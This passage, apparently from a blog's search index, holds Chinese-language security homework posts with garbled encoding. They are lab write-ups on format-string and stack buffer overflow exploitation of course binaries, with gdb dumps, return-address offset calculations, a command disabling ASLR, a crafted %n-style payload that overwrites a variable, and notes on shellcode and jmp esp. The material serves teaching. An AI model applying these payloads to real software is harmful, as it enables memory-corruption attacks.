$0x8,%esp 0x000012cc \u0026lt;+159\u0026gt;: lea -0x40c(%ebp),%eax 0x000012d2 \u0026lt;+165\u0026gt;: push %eax 0x000012d3 \u0026lt;+166\u0026gt;: lea -0x1f7d(%ebx),%eax 0x000012d9 \u0026lt;+172\u0026gt;: push %eax 0x000012da \u0026lt;+173\u0026gt;: call 0x10e0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x000012df \u0026lt;+178\u0026gt;: add $0x10,%esp 0x000012e2 \u0026lt;+181\u0026gt;: sub $0xc,%esp 0x000012e5 \u0026lt;+184\u0026gt;: lea -0x40c(%ebp),%eax 0x000012eb \u0026lt;+190\u0026gt;: push %eax 0x000012ec \u0026lt;+191\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000012f1 \u0026lt;+196\u0026gt;: add $0x10,%esp 0x000012f4 \u0026lt;+199\u0026gt;: sub $0xc,%esp 0x000012f7 \u0026lt;+202\u0026gt;: lea -0x1f7a(%ebx),%eax 0x000012fd \u0026lt;+208\u0026gt;: push %eax 0x000012fe \u0026lt;+209\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 0x00001303 \u0026lt;+214\u0026gt;: add $0x10,%esp 0x00001306 \u0026lt;+217\u0026gt;: mov -0x410(%ebp),%ecx 0x0000130c \u0026lt;+223\u0026gt;: mov -0x414(%ebp),%edx 0x00001312 \u0026lt;+229\u0026gt;: mov -0x418(%ebp),%eax 0x00001318 \u0026lt;+235\u0026gt;: push %ecx 0x00001319 \u0026lt;+236\u0026gt;: push %edx 0x0000131a \u0026lt;+237\u0026gt;: push %eax 0x0000131b \u0026lt;+238\u0026gt;: lea -0x1f78(%ebx),%eax 0x00001321 \u0026lt;+244\u0026gt;: push %eax 0x00001322 \u0026lt;+245\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x00001327 \u0026lt;+250\u0026gt;: add $0x10,%esp 0x0000132a \u0026lt;+253\u0026gt;: nop 0x0000132b \u0026lt;+254\u0026gt;: mov -0xc(%ebp),%eax 0x0000132e \u0026lt;+257\u0026gt;: xor %gs:0x14,%eax 0x00001335 \u0026lt;+264\u0026gt;: je 0x133c \u0026lt;formatstr_vul+271\u0026gt; 0x00001337 \u0026lt;+266\u0026gt;: call 0x13f0 \u0026lt;__stack_chk_fail_local\u0026gt; 0x0000133c \u0026lt;+271\u0026gt;: mov -0x4(%ebp),%ebx 0x0000133f \u0026lt;+274\u0026gt;: leave 0x00001340 \u0026lt;+275\u0026gt;: ret End of assembler dump. (gdb) b *(formatstr_vul+191) Breakpoint 1 at 0x12ec (gdb) r Starting program: /home/azureuser/hw/v2 \u0026amp;A=0xffffcde0 \u0026amp;B=0xffffcde4 C=0xffffcde8. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\nBreakpoint 1, 0x565562ec in formatstr_vul () (gdb) x/x $esp 0xffffcdd0: 0xffffcdec (gdb) p (0xbfffcdec-0xbfffcdd0)/4 $1 = 7\nå› æ­¤ï¼Œuser_inputçš„é¦–åœ°å€ä¸º0xffffcdecï¼Œä½äºæ ˆé¡¶å¼€å§‹çš„ç¬¬7ä¸ª(4å­— èŠ‚ï¼‰å•å…ƒã€‚\nå…³é—­åœ°å€éšæœºåŒ–æœºåˆ¶: sudo sysctl -w kernel.randomize_va_space=0\næ ¹æ®ä¸Šé¢å¯çŸ¥ \u0026amp;B=0xffffcde4=4294954468\n1 2 3 4 5 6 7 8 9 10 11 12 azureuser@MyServer:~/hw$ ./read2file Please enter an address. 4294954468 Please enter the format string: %08x.%08x.%08x.%08x.%08x.%08x.%08x. The string length is 39 azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026amp;A=0xffffce30 \u0026amp;B=0xffffce34 C=0xffffce38. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ï¿½ï¿½ï¿½ï¿½ffffce3c.00005657.00007879.00003435.00005657.00007879.ffffcde4. New values A=0x3435 B=0x5657 C=0x7879. å˜é‡Bçš„åœ°å€é€å…¥å †æ ˆï¼Œ\u0026amp;B=0xffffce34 =4294954548\nç¼–è¯‘ read2file2.c azureuser@MyServer:~/hw$ gcc -m32 -o read2file2 read2file2.c\n0xCDEF - 5*9 - 12 = 52662 0x5678 - 0xCDEF = -30583\nå½“å°è¯•è®¡ç®—0x5678 - 0xCDEFæ—¶å¾—åˆ°äº†è´Ÿæ•°ï¼Œè¿™æ˜¯å› ä¸º0x5678å°äº0xCDEFã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åˆ©ç”¨æ— ç¬¦å·æ•´æ•°çš„ç¯ç»•æ€§è´¨ã€‚\nå°†è´Ÿæ•°-30583è§†ä¸ºä¸€ä¸ªå¤§çš„æ­£æ•°ã€‚å…·ä½“æ¥è¯´ï¼Œå°†-30583æ·»åŠ åˆ°2^16ï¼ˆå³65536ï¼Œå› ä¸º%hnå†™å…¥çš„æ˜¯16ä½å€¼ï¼‰æ¥å¾—åˆ°ä¸€ä¸ªæ­£æ•°ï¼š\n65536âˆ’30583=34953\nä½¿ç”¨34953ä½œä¸º%hnçš„å€¼æ¥ä»£æ›¿-30583ã€‚\nå¾—åˆ°å­—ç¬¦ä¸²ï¼š %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x.\nå‘½ä»¤è¡Œè¾“å…¥åˆ°æ–‡ä»¶mystringä¸­\n1 2 3 4 5 6 azureuser@MyServer:~/hw$ ./read2file2 Please enter an address. 4294954548 Please enter the format string: %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x. The string length is 70 å°†æ–‡ä»¶mystringä½œä¸ºè¾“å…¥é‡å®šå‘åˆ°æ¼æ´ç¨‹åºï¼Œå¹¶å°†è¾“å‡ºå®šå‘åˆ° æ–‡ä»¶result.txtä¸­ï¼š\n1 2 3 azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026gt; result.txt azureuser@MyServer:~/hw$ tail -n 1 result.txt New values A=0x3435 B=0x5678cdef C=0x7879. ","date":"2023-12-18T11:28:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š8"},{"content":"ç¬¬ä¹ç«  ç®€è¿°shellcode çš„æ¦‚å¿µä»¥åŠç¼–å†™shellcodeçš„æ­¥éª¤ã€‚\nshellcodeæ˜¯æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå…¶åŠŸèƒ½å–å†³äºç¼–å†™è€…çš„æ„å›¾ã€‚ ç¼–å†™shellcodeè¦ç»è¿‡ä»¥ä¸‹3ä¸ªæ­¥éª¤ï¼š ç¼–å†™ç®€æ´çš„èƒ½å®Œæˆæ‰€éœ€åŠŸèƒ½çš„Cç¨‹åºï¼› åæ±‡ç¼–å¯æ‰§è¡Œä»£ç ï¼Œç”¨ç³»ç»ŸåŠŸèƒ½è°ƒç”¨ä»£æ›¿å‡½æ•°è°ƒç”¨ï¼Œç”¨æ±‡ç¼–è¯­è¨€å®ç°ç›¸åŒçš„åŠŸèƒ½ï¼› æå–å‡ºæ“ä½œç ï¼Œå†™æˆshellcodeï¼Œå¹¶ç”¨Cç¨‹åºéªŒè¯ã€‚ Linuxç¯å¢ƒä¸‹çš„shellcodeä¸ºä»€ä¹ˆä¸è°ƒç”¨libcä¸­çš„åº“å‡½æ•°ï¼Œè€Œæ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Ÿ\né€šè¿‡ç³»ç»Ÿè°ƒç”¨å¯ä»¥ç›´æ¥è®¿é—®ç³»ç»Ÿå†…æ ¸ï¼Œå…·æœ‰éå¸¸å¼ºå¤§çš„åŠŸèƒ½ã€‚ Shellcode é€šå¸¸éœ€è¦å°½å¯èƒ½å°ï¼Œä»¥ä¾¿èƒ½å¤Ÿæœ‰æ•ˆåœ°æ³¨å…¥åˆ°å—é™çš„å†…å­˜ç©ºé—´æˆ–æ•°æ®æµä¸­ã€‚ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ¯”è°ƒç”¨ libc å‡½æ•°å ç”¨æ›´å°‘çš„ç©ºé—´ï¼Œå› ä¸ºè¿™é¿å…äº†é“¾æ¥å’ŒåŠ è½½æ•´ä¸ªåº“çš„å¼€é”€ã€‚ åœ¨å®‰å…¨æµ‹è¯•å’Œæ¸—é€æµ‹è¯•ä¸­ï¼Œshellcode éœ€è¦å°½å¯èƒ½éšè”½åœ°æ‰§è¡Œã€‚ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å¯èƒ½å¸®åŠ©ç»•è¿‡ä¸€äº›å®‰å…¨ç›‘æµ‹å·¥å…·å’Œé˜²å¾¡æœºåˆ¶ï¼Œå› ä¸ºå®ƒä»¬æ›´å¤šåœ°å…³æ³¨å¯¹å¸¸è§åº“å‡½æ•°çš„è°ƒç”¨ã€‚ ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å¯ä»¥ä½¿shellcodeæ›´åŠ ç‹¬ç«‹å’Œå¯ç§»æ¤ã€‚å› ä¸ºlibcçš„ç‰ˆæœ¬å’Œå®ç°åœ¨ä¸åŒçš„ç³»ç»Ÿå’Œç¯å¢ƒä¸­å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œä¾èµ–äºç‰¹å®šç‰ˆæœ¬çš„libcå‡½æ•°å¯èƒ½ä¼šå¯¼è‡´shellcodeåœ¨æŸäº›ç¯å¢ƒä¸‹æ— æ³•æ­£å¸¸å·¥ä½œã€‚ åœ¨æ”»å‡»å­—ç¬¦ä¸²ä¸­4å­—èŠ‚çš„RETé™¤äº†å…¶å–åœ¨æ”»å‡»å­—ç¬¦ä¸²ä¸­4å­—èŠ‚çš„RETé™¤äº†å…¶å–å€¼èŒƒå›´è¦çŒœæµ‹å‡†ç¡®å¤–ï¼Œè¿˜æœ‰ä»€ä¹ˆéœ€è¦è€ƒè™‘çš„ï¼ˆæˆ–è€…è¯´æœ‰ä»€ä¹ˆé™åˆ¶ï¼‰ï¼Ÿ\nåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œç°ä»£æ“ä½œç³»ç»Ÿé‡‡ç”¨äº†åœ°å€éšæœºåŒ–æŠ€æœ¯ï¼Œç¼“å†²åŒºçš„èµ·å§‹åœ°å€æ˜¯ä¼šåŠ¨æ€å˜åŒ–çš„ï¼Œå¿…é¡»åœ¨æ”»å‡»ä¸²ä¸­æ”¾ç½®è¶³å¤Ÿå¤šçš„NOPï¼Œä»¥ä½¿å¾—RETçš„å–å€¼èŒƒå›´è¶³å¤Ÿå¤§ï¼Œæ‰èƒ½çŒœæµ‹ä¸€ä¸ªæ­£ç¡®çš„RETã€‚ RETæŒ‡ä»¤çš„è¿”å›åœ°å€æ˜¯å‡½æ•°è¿”å›æ—¶è¦è·³è½¬åˆ°çš„åœ°å€ã€‚å¦‚æœè¿”å›åœ°å€æŒ‡å‘äº†ç¨‹åºçš„ä¸å¯æ‰§è¡Œä»£ç åŒºåŸŸï¼Œåˆ™æ”»å‡»ä¹Ÿå°†å¤±è´¥ã€‚ ä¸€äº›ç¨‹åºå¯èƒ½ä¼šä½¿ç”¨æ ˆä¿æŠ¤æ¥é˜²æ­¢æº¢å‡ºæ”»å‡»ã€‚ä¾‹å¦‚ï¼Œç¨‹åºå¯èƒ½ä¼šè®¾ç½®æ ˆçš„å¤§å°é™åˆ¶ï¼Œæˆ–è€…ä½¿ç”¨æ ˆä¿æŠ¤æŒ‡ä»¤æ¥æ£€æŸ¥æ ˆæ˜¯å¦æº¢å‡ºã€‚ RETæŒ‡ä»¤çš„åœ°å€å¿…é¡»å…·æœ‰å¯å†™æƒé™ã€‚å¦‚æœRETæŒ‡ä»¤çš„åœ°å€å…·æœ‰åªè¯»æƒé™ï¼Œåˆ™ç¨‹åºå°†æ— æ³•ä¿®æ”¹è¯¥åœ°å€ã€‚ å¦‚æœRETåœ°å€åŒ…å«é›¶å­—èŠ‚ï¼Œé‚£ä¹ˆåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºå¯èƒ½ä¼šæå‰ç»ˆæ­¢å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œè¿™å¯èƒ½ä¼šé˜»æ­¢æ”»å‡»çš„è¿›è¡Œã€‚ ç¬¬åç«  ç®€è¿°è¿›ç¨‹è·³è½¬æ”»å‡»æ–¹æ³•çš„åŸºæœ¬æ€æƒ³\nä»ç³»ç»Ÿå¿…é¡»åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“(å¦‚ntdll.dllï¼Œkernel32.dll)ä¸­å¯»æ‰¾call espå’Œjmp espæŒ‡ä»¤ï¼Œè®°å½•ä¸‹è¯¥åœ°å€ï¼ˆæº¢å‡ºæ”»å‡»çš„è·³è½¬åœ°å€ï¼‰ï¼Œå°†è¯¥åœ°å€è¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œå°†shellcodeæ”¾åœ¨è¿”å›åœ°å€æ‰€åœ¨å•å…ƒçš„åé¢ã€‚ è¿™æ ·å°±ç¡®ä¿æº¢å‡ºåé€šè¿‡åŠ¨æ€é“¾æ¥åº“ä¸­çš„æŒ‡ä»¤è€Œè·³è½¬åˆ°è¢«æ³¨å…¥åˆ°è¿›ç¨‹å †æ ˆä¸­çš„shellcodeã€‚ ","date":"2023-12-13T21:46:25+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š6"},{"content":"å¾—åˆ†ï¼š10/10\nCç¨‹åºhomework08.cçš„ä¸»å‡½æ•°å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 int main(int argc, char * argv[]) { init_buf(Lbuffer, LEN); switch(argc) { case 1: f00(); break; case 2: f01(); break; case 3: f02(); break; default: f00(); break; } puts(\u0026#34;Done.\\nThe program exited normally.\u0026#34;); return 0; } åœ¨32ä½çš„ubuntu16.04ç³»ç»Ÿä¸­ç”¨gcc -fno-stack-protector ç¼–è¯‘è¯¥ç¨‹åºï¼Œå¾—åˆ°çš„å¯æ‰§è¡Œç¨‹åºè§é™„ä»¶ï¼Œé€šè¿‡gdbè°ƒè¯•ï¼Œå¯¹f00()ã€f01()å’Œf02()è¿›è¡Œåˆ†æï¼š (1) å‡½æ•°f00()ã€f01()å’Œf02()æ˜¯å¦å¯¼è‡´æ®µé”™è¯¯ã€‚ å¦‚æœæ²¡æœ‰å‘½ä»¤è¡Œå‚æ•°ï¼ˆargc ç­‰äº 1ï¼Œå› ä¸ºç¨‹åºåæœ¬èº«ä¹Ÿç®—ä¸€ä¸ªå‚æ•°ï¼‰ï¼Œåˆ™æ‰§è¡Œå‡½æ•° f00()ã€‚ å¦‚æœæœ‰ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼ˆargc ç­‰äº 2ï¼‰ï¼Œåˆ™æ‰§è¡Œå‡½æ•° f01()ã€‚ å¦‚æœæœ‰ä¸¤ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼ˆargc ç­‰äº 3ï¼‰ï¼Œåˆ™æ‰§è¡Œå‡½æ•° f02()ã€‚ å¦‚æœæœ‰ä¸‰ä¸ªæˆ–æ›´å¤šçš„å‘½ä»¤è¡Œå‚æ•°ï¼Œè¿˜æ˜¯æ‰§è¡Œå‡½æ•° f00()ã€‚ ![[Pasted image 20231122231415.png]] å‡½æ•°foo(),Â å’ŒÂ foo01()Â éƒ½ä¼šå¯¼è‡´æ®µé”™è¯¯ã€‚\nå¦‚æœå‡½æ•°f00()ã€f01()å’Œf02()å¯¼è‡´æ®µé”™è¯¯ï¼Œè®¡ç®—å‡ºè¢«æ”»å‡»çš„ç¼“å†²åŒºé¦–åœ°å€ä¸å‡½æ•°çš„è¿”å›åœ°å€æ‰€åœ¨çš„æ ˆåœ°å€çš„è·ç¦»ï¼ˆå³åç§»OFFSET)ï¼Œç»™å‡ºæº¢å‡ºåå‡½æ•°çš„è¿”å›åœ°å€(ç”¨16è¿›åˆ¶æ•°è¡¨ç¤º)ã€‚ f00() ![[Pasted image 20231121150016.png]]\næ‰“æ–­ç‚¹ å‡½æ•°å…¥å£å¤„çš„å †æ ˆæŒ‡é’ˆespæŒ‡å‘çš„æ ˆï¼ˆåœ°å€ä¸º0xffffd1dcï¼‰ä¿å­˜äº† å‡½æ•°f00()è¿”å›åˆ°è°ƒç”¨å‡½æ•°(main)çš„åœ°å€ï¼ˆ0x080485a8ï¼‰ï¼Œå³â€œå‡½æ•°çš„è¿”å›åœ°å€â€\nè®°å½•å †æ ˆæŒ‡é’ˆespçš„å€¼ï¼Œåœ¨æ­¤ä»¥Aæ ‡è®°ï¼šA=$esp = 0xffffd1dc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 (gdb) x/x $esp 0xffffd1dc: 0x080485a8 (gdb) c Continuing. Breakpoint 2, 0x080484e9 in f00 () 1: x/i $eip =\u0026gt; 0x80484e9 \u0026lt;f00+24\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; (gdb) x/x $esp 0xffffd140: 0xffffd155 (gdb) 0xffffd144: 0x0804a060 (gdb) x/x 0x0804a060 0x804a060 \u0026lt;Lbuffer\u0026gt;: 0x44434241 ä»¤B = 0xffffd155ï¼Œåˆ™offset=A-B=0xffffd1dc - 0xffffd155 =0x87=135ã€‚\n1 2 3 4 5 6 7 8 9 10 (gdb) c Continuing. Breakpoint 3, 0x080484f3 in f00 () 1: x/i $eip =\u0026gt; 0x80484f3 \u0026lt;f00+34\u0026gt;: ret (gdb) x/x $esp 0xffffd1dc: 0x49484746 (gdb) x/s $esp 0xffffd1dc: \u0026#34;FGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVW\u0026#34;... æ‰§è¡Œretä¹‹å‰çš„å †æ ˆçš„å†…å®¹å¯ä»¥æ¨æ–­æ‰§è¡Œretåå°†è·³åˆ°åœ°å€0x49484746å»æ‰§è¡Œ\nf01 æ‰§è¡Œç¨‹åº\n1 azureuser@MyServer:~/hw$ gdb homework08 main\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 (gdb) disas main Dump of assembler code for function main: 0x0804856c \u0026lt;+0\u0026gt;: lea 0x4(%esp),%ecx 0x08048570 \u0026lt;+4\u0026gt;: and $0xfffffff0,%esp 0x08048573 \u0026lt;+7\u0026gt;: pushl -0x4(%ecx) 0x08048576 \u0026lt;+10\u0026gt;: push %ebp 0x08048577 \u0026lt;+11\u0026gt;: mov %esp,%ebp 0x08048579 \u0026lt;+13\u0026gt;: push %ebx 0x0804857a \u0026lt;+14\u0026gt;: push %ecx 0x0804857b \u0026lt;+15\u0026gt;: mov %ecx,%ebx 0x0804857d \u0026lt;+17\u0026gt;: sub $0x8,%esp 0x08048580 \u0026lt;+20\u0026gt;: push $0x400 0x08048585 \u0026lt;+25\u0026gt;: push $0x804a060 0x0804858a \u0026lt;+30\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 0x0804858f \u0026lt;+35\u0026gt;: add $0x10,%esp 0x08048592 \u0026lt;+38\u0026gt;: mov (%ebx),%eax 0x08048594 \u0026lt;+40\u0026gt;: cmp $0x2,%eax 0x08048597 \u0026lt;+43\u0026gt;: je 0x80485aa \u0026lt;main+62\u0026gt; 0x08048599 \u0026lt;+45\u0026gt;: cmp $0x3,%eax 0x0804859c \u0026lt;+48\u0026gt;: je 0x80485b1 \u0026lt;main+69\u0026gt; 0x0804859e \u0026lt;+50\u0026gt;: cmp $0x1,%eax 0x080485a1 \u0026lt;+53\u0026gt;: jne 0x80485b8 \u0026lt;main+76\u0026gt; 0x080485a3 \u0026lt;+55\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 0x080485a8 \u0026lt;+60\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485aa \u0026lt;+62\u0026gt;: call 0x80484f4 \u0026lt;f01\u0026gt; 0x080485af \u0026lt;+67\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485b1 \u0026lt;+69\u0026gt;: call 0x8048530 \u0026lt;f02\u0026gt; 0x080485b6 \u0026lt;+74\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485b8 \u0026lt;+76\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 0x080485bd \u0026lt;+81\u0026gt;: nop 0x080485be \u0026lt;+82\u0026gt;: sub $0xc,%esp 0x080485c1 \u0026lt;+85\u0026gt;: push $0x8048660 0x080485c6 \u0026lt;+90\u0026gt;: call 0x8048330 \u0026lt;puts@plt\u0026gt; 0x080485cb \u0026lt;+95\u0026gt;: add $0x10,%esp 0x080485ce \u0026lt;+98\u0026gt;: mov $0x0,%eax 0x080485d3 \u0026lt;+103\u0026gt;: lea -0x8(%ebp),%esp 0x080485d6 \u0026lt;+106\u0026gt;: pop %ecx 0x080485d7 \u0026lt;+107\u0026gt;: pop %ebx 0x080485d8 \u0026lt;+108\u0026gt;: pop %ebp 0x080485d9 \u0026lt;+109\u0026gt;: lea -0x4(%ecx),%esp 0x080485dc \u0026lt;+112\u0026gt;: ret End of assembler dump. f01()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 (gdb) disas f01 Dump of assembler code for function f01: 0x080484f4 \u0026lt;+0\u0026gt;: push %ebp 0x080484f5 \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080484f7 \u0026lt;+3\u0026gt;: sub $0x508,%esp 0x080484fd \u0026lt;+9\u0026gt;: sub $0x8,%esp 0x08048500 \u0026lt;+12\u0026gt;: push $0x400 0x08048505 \u0026lt;+17\u0026gt;: lea -0x4fe(%ebp),%eax 0x0804850b \u0026lt;+23\u0026gt;: push %eax 0x0804850c \u0026lt;+24\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 0x08048511 \u0026lt;+29\u0026gt;: add $0x10,%esp 0x08048514 \u0026lt;+32\u0026gt;: sub $0x8,%esp 0x08048517 \u0026lt;+35\u0026gt;: lea -0x4fe(%ebp),%eax 0x0804851d \u0026lt;+41\u0026gt;: push %eax 0x0804851e \u0026lt;+42\u0026gt;: lea -0xfe(%ebp),%eax 0x08048524 \u0026lt;+48\u0026gt;: push %eax 0x08048525 \u0026lt;+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; 0x0804852a \u0026lt;+54\u0026gt;: add $0x10,%esp 0x0804852d \u0026lt;+57\u0026gt;: nop 0x0804852e \u0026lt;+58\u0026gt;: leave 0x0804852f \u0026lt;+59\u0026gt;: ret End of assembler dump. è®¾ç½®æ–­ç‚¹\n1 2 3 4 5 6 (gdb) b*(f01+0) Breakpoint 1 at 0x80484f4 (gdb) b*(f01+49) Breakpoint 2 at 0x8048525 (gdb) b*(f01+59) Breakpoint 3 at 0x804852f 1 2 3 4 5 6 7 8 9 10 11 12 13 (gdb) display/i $eip 1: x/i $eip \u0026lt;error: No registers.\u0026gt; (gdb) x/i $eip No registers. (gdb) run 1 Starting program: /home/azureuser/hw/homework08 1 Breakpoint 1, 0x080484f4 in f01 () 1: x/i $eip =\u0026gt; 0x80484f4 \u0026lt;f01\u0026gt;: push %ebp (gdb) x/x $esp 0xffffd1cc: 0x080485af è®°å½•å †æ ˆæŒ‡é’ˆespçš„å€¼ï¼Œåœ¨æ­¤ä»¥Aæ ‡è®°ï¼šA=$esp = 0xffffd1cc\nç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹\n1 2 3 4 5 6 7 8 9 10 11 12 (gdb) c Continuing. Breakpoint 2, 0x08048525 in f01 () 1: x/i $eip =\u0026gt; 0x8048525 \u0026lt;f01+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; (gdb) x $esp 0xffffccb0: 0xffffd0ca (gdb) 0xffffccb4: 0xffffccca (gdb) x/x 0xffffccca 0xffffccca: 0x44434241 B=0xffffd0caã€‚\noffset=A-B= 0xffffd1cc - 0xffffd0ca =0x102=258ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (gdb) c Continuing. Breakpoint 3, 0x0804852f in f01 () 1: x/i $eip =\u0026gt; 0x804852f \u0026lt;f01+59\u0026gt;: ret (gdb) x/x $esp 0xffffd1cc: 0x42415a59 (gdb) x/s $esp 0xffffd1cc: \u0026#34;YZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOP\u0026#34;... (gdb) si 0x42415a59 in ?? () 1: x/i $eip =\u0026gt; 0x42415a59: \u0026lt;error: Cannot access memory at address 0x42415a59\u0026gt; (gdb) x/s $esp 0xffffd1d0: \u0026#34;CDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRST\u0026#34;... è¿”å›åœ°å€å˜ ä¸º 0x42415a59\nå…¶ä»–ï¼ˆæœ¬æ¬¡å®éªŒçš„ä¸€äº›å…¶å®ƒå°è¯•ï¼‰ ç”±äºè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ˜¯ubuntu16.04ç¼–è¯‘çš„ï¼Œæœ¬èº«æˆ‘çš„è™šæ‹Ÿæœºç³»ç»Ÿæ˜¯ubuntu18.04ï¼Œä¸€å¼€å§‹æ‰§è¡Œæ–‡ä»¶è€æ˜¯æŠ¥é”™ï¼š 1 2 ~$ ./homework08 -bash: ./homework08: No such file or directory æŸ¥è¯¢ä¹‹åå‘ç°ä¸æ˜¯æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ˜¯ç¼ºå°‘éœ€è¦çš„ä¾èµ–ï¼Œå› ä¸ºUbuntu18.04é»˜è®¤å»æ‰äº†32bitçš„libraryã€‚\nè§£å†³æ–¹æ³•\n1 sudoÂ apt-getÂ installÂ lib32z1 ä¹‹åå°±å¯ä»¥æ‰§è¡Œäº†ã€‚\næœ¬èº«è‡ªå·±çš„ç”µè„‘æ˜¯mac m2èŠ¯ç‰‡ï¼Œä¸€å¼€å§‹æ²¡å°è¯•ä½¿ç”¨è™šæ‹Ÿæœºè€Œæ˜¯dockeråœ¨å®¹å™¨å†…å»pull ubuntuçš„é•œåƒæ¥å°è¯•å®éªŒï¼š% docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --platform linux/386 -v \u0026quot;/Users/agq/Downloads/srcToStudent:/srcToStudent\u0026quot; --name=hw6 i386/ubuntu /bin/bash å‘ç°èƒ½è¿è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥æ˜¾ç¤ºæ®µé”™è¯¯ï¼š\nä½†ç”±äºqemuå¤©ç”Ÿä¸æ”¯æŒptraceç³»ç»Ÿè°ƒç”¨ï¼Œè€Œgdbæ­£æ˜¯ä¾èµ–è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œè°ƒè¯•ï¼ˆQEMU\u0026rsquo;s user-mode emulation does not support the ptrace system callï¼‰æ‰€ä»¥ç¬¬äºŒé¢˜å°±åšä¸äº†ï¼Œé‚ä½œç½¢ã€‚\n","date":"2023-11-24T15:55:04+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š5"},{"content":"åŸºæœ¬æ“ä½œ æŸ¥çœ‹å¹¶è®°å½• HostA å’Œ S çš„ IPv6(ens5 scope:link) åœ°å€ å‘½ä»¤ ifconfig ens5ã€‚ å‘½ä»¤è§£é‡Š ifconfigæ˜¯ä¸€ä¸ªç”¨äºé…ç½®å’Œæ˜¾ç¤ºLinuxæ“ä½œç³»ç»Ÿç½‘ç»œæ¥å£ä¿¡æ¯çš„å‘½ä»¤ã€‚å½“æ‰§è¡Œifconfig ens5å‘½ä»¤æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºens5ç½‘ç»œæ¥å£çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬IPåœ°å€ã€å­ç½‘æ©ç ã€MACåœ°å€ã€æ•°æ®åŒ…ç»Ÿè®¡ç­‰ã€‚\nIPv6 è¿æ¥ï¼š HostA çš„ç»ˆç«¯ 1 ä¸­æ‰§è¡Œ `sudo tcpdump -vxn host HostA çš„ 